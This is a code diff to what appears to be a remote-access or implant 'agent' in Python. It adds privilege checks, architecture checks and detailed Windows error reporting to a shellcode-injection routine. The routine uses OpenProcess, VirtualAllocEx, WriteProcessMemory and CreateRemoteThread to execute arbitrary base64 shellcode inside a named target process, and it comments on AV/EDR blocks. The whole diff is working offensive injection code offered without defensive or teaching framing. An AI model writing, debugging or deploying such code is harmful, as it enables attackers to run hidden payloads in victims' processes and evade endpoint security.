@@ -141,8 +141,39 @@ def validate_shellcode(shellcode_b64):
     except Exception as e:
         return False, f"Invalid base64 shellcode: {str(e)}"
 
+def is_admin():
+    if platform.system() == 'Windows':
+        try:
+            import ctypes
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except Exception:
+            return False
+    return os.geteuid() == 0
+
+def get_process_architecture(pid):
+    if platform.system() != 'Windows':
+        return None
+    import ctypes
+    import sys
+    PROCESS_QUERY_INFORMATION = 0x0400
+    PROCESS_VM_READ = 0x0010
+    handle = ctypes.windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
+    if not handle:
+        return None
+    is_wow64 = ctypes.c_int(0)
+    ctypes.windll.kernel32.IsWow64Process(handle, ctypes.byref(is_wow64))
+    ctypes.windll.kernel32.CloseHandle(handle)
+    if is_wow64.value:
+        return 'x86'
+    else:
+        return 'x64' if sys.maxsize > 2**32 else 'x86'
+
+def get_agent_architecture():
+    import struct
+    return 'x64' if struct.calcsize('P') * 8 == 64 else 'x86'
+
 def inject_shellcode(process_name, shellcode_b64):
-    """Inject shellcode into a target process"""
+    """Inject shellcode into a target process with improved diagnostics"""
     try:
         # Validate inputs
         if not process_name:
@@ -168,9 +199,13 @@ def inject_shellcode(process_name, shellcode_b64):
                 'error': 'Shellcode injection only supported on Windows',
                 'timestamp': datetime.now().isoformat()
             }
-            
+        
+        # Privilege check
+        if not is_admin():
+            logging.warning('Agent is not running as Administrator. Injection may fail.')
+        
         logging.info(f"Attempting to inject shellcode into process: {process_name}")
-            
+        
         # Required Windows API functions
         kernel32 = ctypes.windll.kernel32
         OpenProcess = kernel32.OpenProcess
@@ -178,6 +213,7 @@ def inject_shellcode(process_name, shellcode_b64):
         WriteProcessMemory = kernel32.WriteProcessMemory
         CreateRemoteThread = kernel32.CreateRemoteThread
         CloseHandle = kernel32.CloseHandle
+        GetLastError = kernel32.GetLastError
         
         # Constants
         PROCESS_ALL_ACCESS = 0x1F0FFF
@@ -191,7 +227,6 @@ def inject_shellcode(process_name, shellcode_b64):
             if proc.info['name'].lower() == process_name.lower():
                 target_pid = proc.info['pid']
                 break
-                
         if not target_pid:
             error_msg = f'Process {process_name} not found'
             logging.error(error_msg)
@@ -200,20 +235,27 @@ def inject_shellcode(process_name, shellcode_b64):
                 'error': error_msg,
                 'timestamp': datetime.now().isoformat()
             }
-            
         logging.info(f"Target process found. PID: {target_pid}")
-            
+        
+        # Architecture check
+        agent_arch = get_agent_architecture()
+        proc_arch = get_process_architecture(target_pid)
+        arch_warning = ''
+        if proc_arch and agent_arch and proc_arch != agent_arch:
+            arch_warning = f"[WARNING] Architecture mismatch: agent is {agent_arch}, target process is {proc_arch}. Injection may fail."
+            logging.warning(arch_warning)
+        
         # Open target process
         process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
         if not process_handle:
-            error_msg = f'Failed to open process {process_name}'
+            last_err = GetLastError()
+            error_msg = f'Failed to open process {process_name} (PID: {target_pid}). WinError: {last_err}\nAgent arch: {agent_arch}, Target arch: {proc_arch}'
             logging.error(error_msg)
             return {
                 'status': 'error',
                 'error': error_msg,
                 'timestamp': datetime.now().isoformat()
             }
-            
         try:
             # Allocate memory in target process
             shellcode_length = len(shellcode)
@@ -224,38 +266,39 @@ def inject_shellcode(process_name, shellcode_b64):
                 MEM_COMMIT | MEM_RESERVE,
                 PAGE_EXECUTE_READWRITE
             )
-            
             if not memory_address:
-                error_msg = 'Failed to allocate memory in target process'
+                last_err = GetLastError()
+                error_msg = f'Failed to allocate memory in target process. WinError: {last_err}\nAgent arch: {agent_arch}, Target arch: {proc_arch}'
                 logging.error(error_msg)
                 return {
                     'status': 'error',
                     'error': error_msg,
                     'timestamp': datetime.now().isoformat()
                 }
-                
             logging.info(f"Memory allocated at: {hex(memory_address)}")
-                
             # Write shellcode to allocated memory
+            written = ctypes.c_size_t(0)
             write_result = WriteProcessMemory(
                 process_handle,
                 memory_address,
                 shellcode,
                 shellcode_length,
-                None
+                ctypes.byref(written)
             )
-            
             if not write_result:
-                error_msg = 'Failed to write shellcode to target process'
+                last_err = GetLastError()
+                error_msg = f'Failed to write shellcode to target process. WinError: {last_err}\nAgent arch: {agent_arch}, Target arch: {proc_arch}'
+                if last_err == 998:
+                    error_msg += "\n[998=Invalid access to memory location. This is almost always an architecture mismatch or AV/EDR block.]"
+                if arch_warning:
+                    error_msg += f"\n{arch_warning}"
                 logging.error(error_msg)
                 return {
                     'status': 'error',
                     'error': error_msg,
                     'timestamp': datetime.now().isoformat()
                 }
-                
             logging.info("Shellcode written to memory successfully")
-                
             # Create remote thread to execute shellcode
             thread_handle = CreateRemoteThread(
                 process_handle,
@@ -266,18 +309,16 @@ def inject_shellcode(process_name, shellcode_b64):
                 0,
                 None
             )
-            
             if not thread_handle:
-                error_msg = 'Failed to create remote thread'
+                last_err = GetLastError()
+                error_msg = f'Failed to create remote thread. WinError: {last_err}\nAgent arch: {agent_arch}, Target arch: {proc_arch}'
                 logging.error(error_msg)
                 return {
                     'status': 'error',
                     'error': error_msg,
                     'timestamp': datetime.now().isoformat()
                 }
-                
             logging.info("Remote thread created successfully")
-            
             return {
                 'status': 'success',
                 'message': f'Shellcode injected into {process_name} (PID: {target_pid})',
@@ -286,15 +327,16 @@ def inject_shellcode(process_name, shellcode_b64):
                     'process_name': process_name,
                     'pid': target_pid,
                     'shellcode_length': shellcode_length,
-                    'memory_address': hex(memory_address)
+                    'memory_address': hex(memory_address),
+                    'agent_arch': agent_arch,
+                    'target_arch': proc_arch
                 }
             }
-            
         finally:
             CloseHandle(process_handle)
-            
     except Exception as e:
-        error_msg = f"Error injecting shellcode: {str(e)}"
+        import traceback
+        error_msg = f"Error injecting shellcode: {str(e)}\n{traceback.format_exc()}"
         logging.error(error_msg)
         return {
             'status': 'error',
